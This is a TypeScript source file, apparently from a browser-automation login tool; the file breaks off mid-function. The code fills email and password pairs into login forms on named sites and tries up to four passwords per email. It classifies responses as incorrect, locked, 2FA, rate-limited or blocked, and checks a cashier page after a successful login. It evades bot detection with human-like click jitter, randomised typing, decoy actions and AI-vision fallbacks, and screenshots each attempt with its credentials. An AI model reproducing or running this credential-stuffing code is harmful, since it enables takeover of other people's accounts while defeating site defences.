export async function executeUnifiedLoginChoreography(input: UnifiedChoreographyInput): Promise<UnifiedLoginResult> {
  const { page, siteName, selectors, targetEmail, password, attemptIdx, inputText, viewport: vp, useVisionCoordinates, cookieGuard, submitTracker } = input;
  const invocationIndex = attemptIdx + 1;
  const entryVariant = input.entryVariant ?? "input_text";
  const acceptanceVariant = input.acceptanceVariant ?? "request_response_dom_acceptance";
  const enterText = (targetPage: Page, selector: string, value: string) =>
    enterTextWithVariant(targetPage, selector, value, entryVariant, inputText);
  const submitMethod = getSubmitMethodForInvocation(invocationIndex, input.primarySubmitVariation);

  // Extract sessionId from page context if available. We'll just pass targetEmail since it uniquely identifies the slot row.
  const observerSessionId = targetEmail;

  AgentObserver.emitState(observerSessionId, "CHOREOGRAPHY_STARTED");
  await AgentObserver.updateOverlay(page, { state: "CHOREOGRAPHY_STARTED", attemptNumber: attemptIdx + 1, totalAttempts: 4, email: targetEmail, password, siteName });

  if (attemptIdx === 0) {
    // ==========================================
    // PHASE 1: THE FIRST RUN (ATTEMPT #1)
    // ==========================================
    let usernameOk = false;
    let passwordOk = false;

    // ── HUMAN-LIKE EARLY CLICK: REMEMBER ME & SHOW PASSWORD ──────────
    // Per explicit user directive, we perform explicit, human-like clicks
    // on the form elements AS EARLY AS REASONABLY POSSIBLE, BEFORE any details/mail/password are filled.
    try {
      const rememberMe = page.locator('label:has-text("Remember"), input[type="checkbox"][id*="remember"], input[type="checkbox"][name*="remember"]').first();
      if (await rememberMe.isVisible({ timeout: 1500 }).catch(() => false)) {
        await rememberMe.click({ delay: Math.random() * 50 + 50 }).catch(() => {});
        log.info(`✅ Clicked Remember Me like a human.`);
      }

      // Early Show Password click before any credentials are typed
      const showPasswordResult = await clickShowPasswordCanonical(page, siteName, selectors.password);
      if (showPasswordResult) {
        log.info(`✅ Clicked Show Password early like a human (${showPasswordResult}).`);
      } else {
        const showPassword = page.locator('button:has-text("Show"), .icon-eye, .eye-icon, [aria-label*="password" i], button[aria-label*="Show" i]').first();
        if (await showPassword.isVisible({ timeout: 500 }).catch(() => false)) {
          await showPassword.click({ delay: Math.random() * 50 + 50 }).catch(() => {});
          log.info(`✅ Clicked Show Password early fallback.`);
        }
      }
    } catch (e) {
      log.debug?.(`Early human-like clicks failed: ${String(e)}`);
    }

    // ── COOKIE GUARD HARD GATE (Golden Template — Rule §6) ──────────────────
    // The CookieGuard blocks until the cookie notice is confirmed dismissed.
    // Cookie notice ALWAYS appears on both target sites (3-10s typical).
    // Login submit CANNOT proceed until this gate clears.
    AgentObserver.emitState(observerSessionId, "DISMISSING_CMP");
    await AgentObserver.updateOverlay(page, { state: "DISMISSING_CMP", attemptNumber: attemptIdx + 1, totalAttempts: 4, email: targetEmail, password, siteName });

    if (cookieGuard) {
      // Unified CookieGuard: waits up to 15s, fires viewport click trick,
      // runs 3-tier cascade, verifies via elementFromPoint
      await cookieGuard.waitUntilDismissed();
      log.info(`✅ CookieGuard gate cleared — form inputs accessible`);
    } else {
      // Fallback: inline cascade (legacy path for tests/backwards compat)
      await page.evaluate(() => {
        try { (window as any).CookieInformation?.submitAllCategories?.(); } catch { /* intentional */ }
      }).catch(() => {});

      for (const sel of ['.coi-banner__accept', '[data-coi-btn="accept"]', 'button:has-text("ACCEPT ALL")', 'button:has-text("Accept All")', 'button:has-text("Accept")']) {
        try {
          const btn = page.locator(sel).first();
          if (await btn.isVisible({ timeout: 500 }).catch(() => false)) {
            await btn.click({ timeout: 2000 });
            log.info(`✅ Cookie banner dismissed via cascade: ${sel}`);
            break;
          }
        } catch { /* intentional */ }
      }

      await page.evaluate(() => {
        for (const el of document.querySelectorAll('.coi-banner, .coi-consent-banner, [id*="cookie"], [class*="cookie-banner"]')) {
          (el as HTMLElement).style.setProperty('display', 'none', 'important');
        }
      }).catch(() => {});
    }

    // ── WICKETKEEPER PoW (non-blocking) ────────────────────────────────────
    const wicketkeeperPromise = handleWicketkeeper(page, siteName).catch((e: any) => {
      log.warn(`Wicketkeeper PoW failed: ${e?.message ?? e}`);
      return null;
    });

    // Blueprint: Email textbox click on attempt 1 only
    await page.getByRole("textbox", { name: /E-mail/i }).click({ force: true, timeout: 3000 }).catch(() => { });

    // ── FILL CREDENTIALS (autofill-first, fallback to individual) ──────────
    log.info(`[Choreography] 1. Starting field population (Attempt 1)...`);
    if (useVisionCoordinates) {
      log.info(`[AIVision] Requesting Viewport Coordinate Markdown matrix...`);
      const coords = await getViewportCoordinateMarkdown(page);
      if (coords && coords.email && coords.password) {
        log.info(`[AIVision] Translating to absolute pixels...`);
        const ex = Math.round(coords.email.x * vp.width);
        const ey = Math.round(coords.email.y * vp.height);
        const px = Math.round(coords.password.x * vp.width);
        const py = Math.round(coords.password.y * vp.height);

        await humanClickAt(page, ex, ey).catch(() => {});
        await page.keyboard.type(targetEmail, { delay: Math.floor(Math.random() * 30) });
        usernameOk = true;

        await humanClickAt(page, px, py).catch(() => {});
        await page.keyboard.type(password, { delay: Math.floor(Math.random() * 30) });
        passwordOk = true;
      } else {
        log.warn(`[AIVision] Coordinate generation failed. Falling back to autofill...`);
      }
    }

    if (!usernameOk || !passwordOk) {
      if ((input as unknown as Record<string, any>).simulateAutofill) {
        try {
          const autofillOk = await (input as unknown as Record<string, any>).simulateAutofill(
            page, selectors.username, selectors.password, targetEmail, password
          );
          if (autofillOk) {
            usernameOk = true;
            passwordOk = true;
            log.debug(`Autofill-style combined fill succeeded.`);
          }
        } catch { }
      }
    }

    if (!usernameOk) {
      AgentObserver.emitState(observerSessionId, "FILLING_CREDENTIALS");
      await AgentObserver.updateOverlay(page, { state: "FILLING_CREDENTIALS", attemptNumber: attemptIdx + 1, totalAttempts: 4, email: targetEmail, password, siteName });
      usernameOk = await enterText(page, selectors.username, targetEmail);
      if (!usernameOk) {
        const healed = await healAndFill(page, "Username input field", targetEmail, siteName, selectors, "username", enterText, persistHealedSelector);
        if (healed) usernameOk = true;
      }
    }
    if (!passwordOk) {
      if (usernameOk) await page.keyboard.press("Tab").catch(() => { });
      passwordOk = await enterText(page, selectors.password, password);
      if (!passwordOk) {
        const healed = await healAndFill(page, "Password input field", password, siteName, selectors, "password", enterText, persistHealedSelector);
        if (healed) passwordOk = true;
      }
    }

    if (!usernameOk || !passwordOk) {
      log.warn(`[AIVision] DOM interaction failed completely. Engaging Zero-Trust Vision Coordinate Fallback.`);
      const coords = await getViewportCoordinateMarkdown(page);
      if (coords && coords.email && coords.password) {
        const ex = Math.round(coords.email.x * vp.width);
        const ey = Math.round(coords.email.y * vp.height);
        const px = Math.round(coords.password.x * vp.width);
        const py = Math.round(coords.password.y * vp.height);

        if (!usernameOk) {
          await humanClickAt(page, ex, ey).catch(() => {});
          await page.keyboard.type(targetEmail, { delay: Math.floor(Math.random() * 30) });
          usernameOk = true;
        }
        if (!passwordOk) {
          await humanClickAt(page, px, py).catch(() => {});
          await page.keyboard.type(password, { delay: Math.floor(Math.random() * 30) });
          passwordOk = true;
        }
      } else {
        log.error(`[AIVision] Zero-Trust Fallback failed. Form cannot be interacted with.`);
        return { success: false };
      }
    }

    // ── PRE-SUBMIT COOKIE & WICKETKEEPER GATES ─────────────────────────────
    // CookieGuard hard gate: if available, verify cookie is dismissed before submit
    if (cookieGuard && !cookieGuard.isDismissed()) {
      log.debug(`Pre-submit gate: CookieGuard reports cookie not yet dismissed, re-checking...`);
      await cookieGuard.recheckAndDismiss();
    }

    if (wicketkeeperPromise) {
      log.debug(`Pre-submit gate: waiting for Wicketkeeper token (max 5s)...`);
      const token = await Promise.race([
        wicketkeeperPromise,
        new Promise<null>(r => setTimeout(() => r(null), 5000))
      ]);
      if (token) log.debug(`Wicketkeeper token ready: ${token.substring(0, 10)}...`);
      else log.warn(`Wicketkeeper gate timed out after 5s — submitting without PoW token`);
    }

    await page.evaluate(() => {
      const STATUS_SYM = Symbol.for("cloak_status");
      (window as unknown as AutomatiWindow)[STATUS_SYM] = null;
      (window as unknown as AutomatiWindow).__automatiCookieDismissed = false;
    }).catch(() => { });

    // ── VERIFY CREDENTIALS BEFORE SUBMIT ────────────────────────────────────
    log.info(`[Choreography] 2. Field population complete. Verifying credentials...`);
    AgentObserver.emitState(observerSessionId, "VERIFYING_CREDENTIALS");
    await AgentObserver.updateOverlay(page, { state: "VERIFYING_CREDENTIALS", attemptNumber: attemptIdx + 1, totalAttempts: 4, email: targetEmail, password, siteName });

    // Verify email and password are filled correctly
    const verification = await verifyCredentialsFilled(page, selectors.username, selectors.password, targetEmail, password);
    if (!verification.emailOk || !verification.passwordOk) {
      log.warn(`[Verification] Credentials not filled correctly before submit. Email OK: ${verification.emailOk}, Password OK: ${verification.passwordOk}`);
      // Re-fill if verification fails
      if (!verification.emailOk) {
        await enterText(page, selectors.username, targetEmail);
      }
      if (!verification.passwordOk) {
        await page.locator(selectors.password).fill("").catch(() => {});
        await enterText(page, selectors.password, password);
      }
      // Re-verify after re-fill
      const reVerification = await verifyCredentialsFilled(page, selectors.username, selectors.password, targetEmail, password);
      if (!reVerification.emailOk || !reVerification.passwordOk) {
        log.error(`[Verification] Credentials still not filled correctly after re-fill attempt`);
        throw new Error("Credentials failed to fill correctly");
      }
    }

    // ── SUBMIT READY GATE ───────────────────────────────────────────────────
    log.info(`[Choreography] 3. Awaiting submit ready gate...`);
    if (submitTracker && submitTracker.getState() !== "IDLE") {
      try { await submitTracker.waitUntilReady(5000); } catch {}
    } else {
      try {
        await page.waitForFunction((args: { sel: string }) => {
          let el: HTMLElement | null = null;
          try { el = document.querySelector(args.sel); } catch { return true; }
          if (!el) return true;
          if ((el as HTMLButtonElement).disabled) return false;
          if (el.getAttribute("aria-disabled") === "true") return false;
          if (el.getAttribute("aria-busy") === "true") return false;
          const style = window.getComputedStyle(el);
          if (style.pointerEvents === "none" || style.visibility === "hidden" || style.display === "none") return false;
          const op = parseFloat(style.opacity || "1");
          if (!isNaN(op) && op < 0.5) return false;
          return true;
        }, { sel: selectors.submit }, { timeout: 5000, polling: 200 });
      } catch {}
    }

    // ── ONE REGISTERED SUBMIT INVOCATION + SYNCHRONIZED EVIDENCE ───────────
    AgentObserver.emitState(observerSessionId, "SUBMITTING_FORM");
    await AgentObserver.updateOverlay(page, { state: "SUBMITTING_FORM", attemptNumber: invocationIndex, totalAttempts: 4, email: targetEmail, password, siteName });

    const preSubmitUrl = page.url();
    const submitStartedAt = Date.now();
    type ResponseResult = { type: "post"; verdict: string | null; status: number } | { type: "nav"; verdict: "success" } | null;

    // Arm listeners before the physical action so fast responses cannot be missed.
    const responsePromise: Promise<ResponseResult> = acceptanceVariant === "request_response_dom_acceptance"
      ? page.waitForResponse(
          res => {
            const isPost = res.request().method() === "POST";
            const url = res.url();
            return isPost && (url.includes("/api") || url.includes("/login") || url.includes("/auth") || url.includes("/graphql"));
          },
          { timeout: 5000 },
        ).then(async (res): Promise<ResponseResult> => {
          const status = res.status();
          let bodyStr = "";
          try { bodyStr = (await res.text()).toLowerCase(); } catch { /* intentional */ }

          let networkVerdict: string | null;
          if (bodyStr.includes("temporarily") || bodyStr.includes("locked") || bodyStr.includes("too many")) networkVerdict = "temporarily_disabled";
          else if (bodyStr.includes("permanently") || bodyStr.includes("been disabled")) networkVerdict = "permanently";
          else if (status === 428 || bodyStr.includes("mfa_required")) networkVerdict = "2FA";
          else if (bodyStr.includes("incorrect") || bodyStr.includes("not found") || bodyStr.includes("no account")) networkVerdict = "incorrect";
          else if (status === 403 || bodyStr.includes("<!doctype html>")) networkVerdict = "blocked";
          else if (status === 429) networkVerdict = "rate_limited";
          else if (status === 0 || status >= 500 || bodyStr.includes("captcha")) networkVerdict = "crash";
          else if (status === 200 || status === 201) networkVerdict = "success";
          else networkVerdict = "unknown";

          if (networkVerdict === "success" && input.cashierPath) {
            const cashierRes = await page.evaluate(async (cashierPath) => {
              try {
                const response = await fetch(cashierPath, { method: "GET", redirect: "follow" });
                return { status: response.status, url: response.url };
              } catch {
                return null;
              }
            }, input.cashierPath);
            if (cashierRes && (cashierRes.url.includes("/login") || cashierRes.url.includes("/signin"))) {
              networkVerdict = "soft_success_failed_cashier";
            }
          }

          return { type: "post", verdict: networkVerdict, status };
        }).catch(() => null)
      : Promise.resolve(null);
    const navigationPromise: Promise<ResponseResult> = acceptanceVariant === "request_response_dom_acceptance"
      ? page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 5000 })
          .then((): ResponseResult => ({ type: "nav", verdict: "success" }))
          .catch(() => null)
      : Promise.resolve(null);

    if (submitTracker) {
      await submitTracker.captureBaseline();
      await submitTracker.markSubmitted();
    }

    let invoked = true;
    let actionReceipt: SubmitActionReceipt | undefined;
    try {
      log.info(`[Choreography] 4. Executing submit action (${submitMethod})...`);
      actionReceipt = await executeSubmit(page, selectors.submit, selectors.password, submitMethod);
    } catch (error) {
      invoked = false;
      log.warn(`[Submit] ${submitMethod} invocation failed: ${error instanceof Error ? error.message : String(error)}`);
    }

    const responseDetected: ResponseResult = invoked
      ? await Promise.race([
          responsePromise,
          navigationPromise,
          new Promise<null>((resolve) => setTimeout(() => resolve(null), 3000)),
        ])
      : null;

    if (submitTracker && invoked) {
      await submitTracker.waitUntilReady(5000).catch(() => "IDLE" as const);
    }
    const trackerSnapshot = submitTracker ? await submitTracker.getAcceptanceSnapshot() : null;
    const formGone = !(await page.locator(selectors.username).isVisible().catch(() => true));
    const urlChanged = page.url() !== preSubmitUrl;
    const formStateChanged = formGone || urlChanged || responseDetected?.type === "nav";
    const finalNetworkVerdict = responseDetected?.verdict
      ?? trackerSnapshot?.cloakStatus
      ?? (formStateChanged ? "success" : undefined);

    const acceptanceEvidence = buildSubmitAcceptanceEvidence({
      runId: input.runId ?? observerSessionId,
      attemptId: input.attemptId ?? `${observerSessionId}:${siteName}:${invocationIndex}`,
      invocationIndex,
      variation: submitMethod,
      invoked,
      actionCount: actionReceipt?.actionCount,
      actionKind: actionReceipt?.actionKind,
      actionCoordinates: actionReceipt?.coordinates,
      protocolEventCount: actionReceipt?.protocolEventCount,
      observerVariant: acceptanceVariant,
      domMutation: trackerSnapshot?.domMutation ?? false,
      networkActivity: responseDetected?.type === "post",
      formStateChanged,
      responseObserved: Boolean(responseDetected) || Boolean(trackerSnapshot?.responseObserved),
      responseClass: toSubmitResponseClass(finalNetworkVerdict),
      responseLatencyMs: Date.now() - submitStartedAt,
      verificationMethod: [
        trackerSnapshot?.domMutation ? "dom" : null,
        responseDetected?.type === "post" ? "network" : null,
        formStateChanged ? "form" : null,
        trackerSnapshot?.responseObserved ? "response" : null,
      ].filter(Boolean).join("+") || "none",
      evidence: `method=${submitMethod};tracker=${trackerSnapshot?.state ?? "none"}`,
    });

    log.info(`[Submit] invocation=${invocationIndex} variation=${submitMethod} accepted=${acceptanceEvidence.accepted} signals=${acceptanceEvidence.acceptanceSignals.join(",") || "none"} verdict=${finalNetworkVerdict ?? "unknown"}`);
    executeGenerativeDecoys(page).catch(() => {});

    const verdict = finalNetworkVerdict || "unknown";
    await ResponseScreenshotter.captureAttempt(page, {
      email: targetEmail, password, site: siteName,
      attemptIdx, verdict,
    }).catch(() => {});

    return {
      success: acceptanceEvidence.accepted,
      submitMethod,
      networkVerdict: finalNetworkVerdict,
      acceptanceEvidence,
      discoveryProvenance: input.discoveryProvenance,
      entryVariant,
      acceptanceVariant,
    };

  } else {
    // ==========================================
    // PHASE 3: FAST-LOOP SEQUENCE (ATTEMPTS #2+)
    // ==========================================
    let passwordOk = false;

    if (attemptIdx < 3) {
      log.info(`[Fast-Loop] 1. Clearing password field and populating payload (Attempt ${attemptIdx + 1})...`);
      // Blueprint Fast-Loop Rule: Email persists in DOM across retries — skip re-fill
      // Only clear and re-inject the new password
      await page.locator(selectors.password).fill("").catch(() => {});

      AgentObserver.emitState(observerSessionId, "FILLING_CREDENTIALS");
      await AgentObserver.updateOverlay(page, { state: "FILLING_CREDENTIALS", attemptNumber: attemptIdx + 1, totalAttempts: 4, email: targetEmail, password, siteName });

      if (useVisionCoordinates) {
        const coords = await getViewportCoordinateMarkdown(page);
        if (coords && coords.password) {
          const px = Math.round(coords.password.x * vp.width);
          const py = Math.round(coords.password.y * vp.height);
          await humanClickAt(page, px, py).catch(() => {});
          await page.keyboard.type(password, { delay: Math.floor(Math.random() * 30) });
          passwordOk = true;
        }
      }

      if (!passwordOk) {
        passwordOk = await enterText(page, selectors.password, password);
        if (!passwordOk) {
          const healed = await healAndFill(page, "Password input field", password, siteName, selectors, "password", enterText, persistHealedSelector);
          if (healed) passwordOk = true;
        }
      }
    } else {
      // Attempt 4: Do not clear the field, leave Password #3 in the field
      log.info(`[Fast-Loop] 1. Attempt 4: Retaining existing payload in password field (bypassing clearing)...`);
      passwordOk = true;
    }

    if (!passwordOk) {
      log.error(`[AIVision] Fast-loop Zero-Trust Fallback failed. Form cannot be interacted with.`);
      return { success: false };
    }
    log.info(`[Fast-Loop] 2. Field preparation complete.`);

    // Wicketkeeper token (check in case it's still running, though usually done by now)
    const wicketkeeperPromise = handleWicketkeeper(page, siteName).catch((e: any) => null);
    if (wicketkeeperPromise) {
      await Promise.race([
        wicketkeeperPromise,
        new Promise<null>(r => setTimeout(() => r(null), 5000))
      ]);
    }

    await page.evaluate(() => {
      const STATUS_SYM = Symbol.for("cloak_status");
      (window as unknown as AutomatiWindow)[STATUS_SYM] = null;
    }).catch(() => { });

    AgentObserver.emitState(observerSessionId, "SUBMITTING_FORM");
    await AgentObserver.updateOverlay(page, { state: "SUBMITTING_FORM", attemptNumber: invocationIndex, totalAttempts: 4, email: targetEmail, password, siteName });

    if (attemptIdx < 3) {
      const fastLoopVerification = await verifyCredentialsFilled(page, selectors.username, selectors.password, targetEmail, password);
      if (!fastLoopVerification.passwordOk) {
        log.warn(`[Fast-Loop] Password not filled correctly before re-submit, re-filling...`);
        await page.locator(selectors.password).fill("").catch(() => {});
        await enterText(page, selectors.password, password);
      }
    }

    // ── SUBMIT READY GATE ───────────────────────────────────────────────────
    log.info(`[Fast-Loop] 3. Awaiting submit ready gate...`);
    if (submitTracker && submitTracker.getState() !== "IDLE") {
      try { await submitTracker.waitUntilReady(5000); } catch {}
    } else {
      try {
        await page.waitForFunction((args: { sel: string }) => {
          let el: HTMLElement | null = null;
          try { el = document.querySelector(args.sel); } catch { return true; }
          if (!el) return true;
          if ((el as HTMLButtonElement).disabled) return false;
          if (el.getAttribute("aria-disabled") === "true") return false;
          if (el.getAttribute("aria-busy") === "true") return false;
          const style = window.getComputedStyle(el);
          if (style.pointerEvents === "none" || style.visibility === "hidden" || style.display === "none") return false;
          const op = parseFloat(style.opacity || "1");
          if (!isNaN(op) && op < 0.5) return false;
          return true;
        }, { sel: selectors.submit }, { timeout: 5000, polling: 200 });
      } catch {}
    }

    const preSubmitUrl = page.url();
    const submitStartedAt = Date.now();
    type FastLoopResponse = { type: "post"; verdict: string | null; status: number } | { type: "nav"; verdict: "success" } | null;

    const responsePromise: Promise<FastLoopResponse> = acceptanceVariant === "request_response_dom_acceptance"
      ? page.waitForResponse(
          res => {
            const url = res.url();
            return res.request().method() === "POST" && (url.includes("/api") || url.includes("/login") || url.includes("/auth") || url.includes("/graphql"));
          },
          { timeout: 5000 },
        ).then(async (res): Promise<FastLoopResponse> => {
          const status = res.status();
          let bodyStr = "";
          try { bodyStr = (await res.text()).toLowerCase(); } catch { /* intentional */ }
          let verdict: string | null;
          if (bodyStr.includes("temporarily") || bodyStr.includes("locked") || bodyStr.includes("too many")) verdict = "temporarily_disabled";
          else if (bodyStr.includes("permanently") || bodyStr.includes("been disabled")) verdict = "permanently";
          else if (status === 428 || bodyStr.includes("mfa_required")) verdict = "2FA";
          else if (bodyStr.includes("incorrect") || bodyStr.includes("not found") || bodyStr.includes("no account")) verdict = "incorrect";
          else if (status === 429) verdict = "rate_limited";
          else if (status === 403 || bodyStr.includes("<!doctype html>")) verdict = "blocked";
          else if (status === 0 || status >= 500 || bodyStr.includes("captcha")) verdict = "crash";
          else if (status === 200 || status === 201) verdict = "success";
          else verdict = "unknown";
          return { type: "post", verdict, status };
        }).catch(() => null)
      : Promise.resolve(null);
    const navigationPromise: Promise<FastLoopResponse> = acceptanceVariant === "request_response_dom_acceptance"
      ? page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 5000 })
          .then((): FastLoopResponse => ({ type: "nav", verdict: "success" }))
          .catch(() => null)
      : Promise.resolve(null);

    if (submitTracker) {
      await submitTracker.resetErrorBaseline();
      await submitTracker.captureBaseline();
      await submitTracker.markSubmitted();
    }

    let invoked = true;
    let actionReceipt: SubmitActionReceipt | undefined;
    try {
      log.info(`[Fast-Loop] 4. Executing submit action (${submitMethod})...`);
      actionReceipt = await executeSubmit(page, selectors.submit, selectors.password, submitMethod);
    } catch (error) {
      invoked = false;
      log.warn(`[Fast-Loop] ${submitMethod} invocation failed: ${error instanceof Error ? error.message : String(error)}`);
    }

    const responseDetected: FastLoopResponse = invoked
      ? await Promise.race([
          responsePromise,
          navigationPromise,
          new Promise<null>((resolve) => setTimeout(() => resolve(null), 3000)),
        ])
      : null;

    if (submitTracker && invoked) {
      await submitTracker.waitUntilReady(5000).catch(() => "IDLE" as const);
    }
    const trackerSnapshot = submitTracker ? await submitTracker.getAcceptanceSnapshot() : null;
    const formGone = !(await page.locator(selectors.username).isVisible().catch(() => true));
    const urlChanged = page.url() !== preSubmitUrl;
    const formStateChanged = formGone || urlChanged || responseDetected?.type === "nav";
    const finalNetworkVerdict = responseDetected?.verdict
      ?? trackerSnapshot?.cloakStatus
      ?? (formStateChanged ? "success" : undefined);

    const acceptanceEvidence = buildSubmitAcceptanceEvidence({
      runId: input.runId ?? observerSessionId,
      attemptId: input.attemptId ?? `${observerSessionId}:${siteName}:${invocationIndex}`,
      invocationIndex,
      variation: submitMethod,
      invoked,
      actionCount: actionReceipt?.actionCount,
      actionKind: actionReceipt?.actionKind,
      actionCoordinates: actionReceipt?.coordinates,
      protocolEventCount: actionReceipt?.protocolEventCount,
      observerVariant: acceptanceVariant,
      domMutation: trackerSnapshot?.domMutation ?? false,
      networkActivity: responseDetected?.type === "post",
      formStateChanged,
      responseObserved: Boolean(responseDetected) || Boolean(trackerSnapshot?.responseObserved),
      responseClass: toSubmitResponseClass(finalNetworkVerdict),
      responseLatencyMs: Date.now() - submitStartedAt,
      verificationMethod: [
        trackerSnapshot?.domMutation ? "dom" : null,
        responseDetected?.type === "post" ? "network" : null,
        formStateChanged ? "form" : null,
        trackerSnapshot?.responseObserved ? "response" : null,
      ].filter(Boolean).join("+") || "none",
      evidence: `method=${submitMethod};tracker=${trackerSnapshot?.state ?? "none"}`,
    });

    log.info(`[Fast-Loop] invocation=${invocationIndex} variation=${submitMethod} accepted=${acceptanceEvidence.accepted} signals=${acceptanceEvidence.acceptanceSignals.join(",") || "none"} verdict=${finalNetworkVerdict ?? "unknown"}`);
    executeGenerativeDecoys(page).catch(() => {});

    try {
      await page.mouse.click(vp.width - 10, vp.height - 10);
      await new Promise(r => setTimeout(r, 10));
    } catch { }

    await ResponseScreenshotter.captureAttempt(page, {
      email: targetEmail, password, site: siteName,
      attemptIdx, verdict: finalNetworkVerdict || "unknown",
    }).catch(() => {});

    return {
      success: acceptanceEvidence.accepted,
      submitMethod,
      networkVerdict: finalNetworkVerdict,
      acceptanceEvidence,
      discoveryProvenance: input.discoveryProvenance,
      entryVariant,
      acceptanceVariant,
    };
  }
}

async function pressTripleClickOnSubmit(page: Page, submitSelector: string, usernameSelector: string): Promise<void> {
    const executeClick = async () => {
        const submitBox = await page.locator(submitSelector).boundingBox().catch(() => null);
        if (submitBox) {
            // Re-use Opt 15: Targeted Coordinate Jitter for the fallback clicks too
            const usableWidth = submitBox.width * 0.4;
            const usableHeight = submitBox.height * 0.4;
            const offsetX = gaussianClamped(0, usableWidth / 4, -usableWidth / 2, usableWidth / 2);
            const offsetY = gaussianClamped(0, usableHeight / 4, -usableHeight / 2, usableHeight / 2);
            const cx = submitBox.x + submitBox.width / 2 + offsetX;
            const cy = submitBox.y + submitBox.height / 2 + offsetY;
            await humanMouseMove(page, cx, cy);
            for (let i = 0; i < 3; i++) {
                await page.mouse.down();
                await new Promise(r => setTimeout(r, 40));
                await page.mouse.up();
                await new Promise(r => setTimeout(r, 40));
            }
        } else {
            await humanClickSelector(page, submitSelector, { force: true });
            await new Promise(r => setTimeout(r, 40));
            await humanClickSelector(page, submitSelector, { force: true });
            await new Promise(r => setTimeout(r, 40));
            await humanClickSelector(page, submitSelector, { force: true });
        }
    };

    // Attempt 1
    await executeClick();
    await new Promise(r => setTimeout(r, 1500));

    // Verification Loop (Opt 12)
    let formStillVisible = await page.locator(usernameSelector).isVisible().catch(() => false);
    let retries = 0;
    while (formStillVisible && retries < 2) {
        log.warn(`[Fallback] Form still visible after fallback click. Retrying click ${retries + 1}/2...`);
        await executeClick();
        await new Promise(r => setTimeout(r, 2000));
        formStillVisible = await page.locator(usernameSelector).isVisible().catch(() => false);
        retries++;
    }
}

// ── Show-password fallback ──────────────────────────────────────────────────
//
// Canonical selector set for every supported site, in priority order. Any
// new "show password" toggle must be appended here — never inline at the
// call site.
export const SHOW_PASSWORD_SELECTORS: { [site: string]: string[] } = {
  joe: [
    "div.ol-inputLeftIconRecipe__rightContent--icon_after > span",
  ],
  ignition: [
    "div.ol-text__rightContent--icon_after > span",
  ],
};

export const GENERIC_SHOW_PASSWORD_SELECTORS: readonly string[] = [
  '[aria-label*="show password" i]',
  '[aria-label*="reveal password" i]',
  '[aria-label*="toggle password" i]',
  '[data-testid*="show-password" i]',
  '[data-testid*="toggle-password" i]',
  "button.show-password",
  "button.toggle-password",
  ".password-toggle",
  ".show-password",
  'button[aria-label*="Show" i]',
  'svg[class*="eye" i]',
  'i[class*="eye" i]',
  '[class*="show-password" i]',
];

/**
 * Click the site's show-password toggle. Returns the selector that
 * succeeded, or null if no toggle could be activated. Site-specific
 * selectors are tried first; the generic set is the fallback.
 */
export async function clickShowPasswordCanonical(
  page: Page,
  siteName: string,
  passwordSelector?: string,
): Promise<string | null> {
  const siteSelectors = SHOW_PASSWORD_SELECTORS[siteName] ?? [];
  const allSelectors = [...siteSelectors, ...GENERIC_SHOW_PASSWORD_SELECTORS];

  const isRevealed = async (): Promise<boolean> => {
    if (!passwordSelector) return true;
    const t = await page.locator(passwordSelector).first().getAttribute("type").catch(() => null);
    return t === "text";
  };

  if (await isRevealed()) return "already_revealed";

  for (const sel of allSelectors) {
    try {
      const btn = page.locator(sel).first();
      if (!(await btn.isVisible({ timeout: 200 }))) continue;
      await btn.click({ timeout: 1000 }).catch(() => { });
      if (await isRevealed()) return sel;
      await btn.dispatchEvent("click").catch(() => { });
      if (await isRevealed()) return sel;
      let ancestor = btn.locator("..");
      for (let depth = 1; depth <= 3; depth++) {
        await ancestor.dispatchEvent("click").catch(() => { });
        if (await isRevealed()) return sel;
        ancestor = ancestor.locator("..");
      }
    } catch { /* selector didn't match — try next */ }
  }
  return null;
}

// ── Cookie banner accept phrases ────────────────────────────────────────────
//
// Both the in-page MutationObserver and the coordinate-calibration script
// scan for these phrases. They live here so neither path can drift.
export const COOKIE_ACCEPT_PHRASES: readonly string[] = [
  "accept all",
  "allow all",
  "accept cookies",
  "i agree",
  "agree",
  "got it",
  "ok",
];

export interface SubmitMutationResult {
  mutated: boolean;
  baselineRestored: boolean;
  initialErrorText: string;
  finalErrorText: string;
  errorVaried: boolean;
}

export async function setupSubmitMutationObserver(page: Page, submitSel: string, emailSel: string) {
  await page.evaluate(({ sSel, eSel }) => {
    (window as unknown as AutomatiWindow).__automatiSubmitObserverResult = null;

    const getDeepText = (root: Node): string => {
      let text = "";
      if (root.nodeType === Node.TEXT_NODE) return (root.textContent || "").trim();
      if (root.nodeType === Node.ELEMENT_NODE) {
        const tag = (root as Element).tagName.toLowerCase();
        if (tag === "script" || tag === "style" || tag === "noscript") return "";
        if ((root as Element).shadowRoot) text += " " + getDeepText((root as Element).shadowRoot as unknown as Node);
      }
      const childNodes = root.childNodes || [];
      for (let i = 0; i < childNodes.length; i++) {
        text += " " + getDeepText(childNodes[i]!);
      }
      return text;
    };

    const getErrorText = () => {
      const emailEl = document.querySelector(eSel);
      let target: Node = document.body;
      if (emailEl) {
        let parent = emailEl.parentElement;
        for (let i = 0; i < 4; i++) {
          if (parent && parent.parentElement) parent = parent.parentElement;
        }
        if (parent) target = parent;
      }
      try {
        return getDeepText(target).replace(/\s+/g, " ").trim().toLowerCase();
      } catch {
        return target.textContent ? target.textContent.toLowerCase() : "";
      }
    };

    const initialErrorText = getErrorText();
    (window as unknown as AutomatiWindow).__automatiErrorBaseline = initialErrorText;

    const btn = document.querySelector(sSel);
    if (!btn) return;

    const initialHtml = btn.outerHTML;
    const initialDisabled = (btn as HTMLButtonElement).disabled;

    let hasMutated = false;

    const checkResult = () => {
       const finalErrorText = getErrorText();
       const errorVaried = initialErrorText !== finalErrorText;
       if ((window as unknown as AutomatiWindow).__hermesMutationTelemetry) {
           (window as unknown as AutomatiWindow).__hermesMutationTelemetry?.({
               type: 'error_varied',
               timestamp: Date.now(),
               initialErrorText,
               finalErrorText,
               errorVaried
           });
       }
       (window as unknown as AutomatiWindow).__automatiSubmitObserverResult = {
          mutated: hasMutated,
          baselineRestored: true,
          initialErrorText,
          finalErrorText,
          errorVaried
       };
       if ((window as unknown as AutomatiWindow).__automatiCleanupObservers) {
          (window as unknown as AutomatiWindow).__automatiCleanupObservers?.();
       }
    };

    const observer = new MutationObserver(() => {
       const currentDisabled = (btn as HTMLButtonElement).disabled;
       const currentHtml = btn.outerHTML;

       if (currentHtml !== initialHtml || currentDisabled !== initialDisabled) {
         hasMutated = true;
         if ((window as unknown as AutomatiWindow).__hermesMutationTelemetry) {
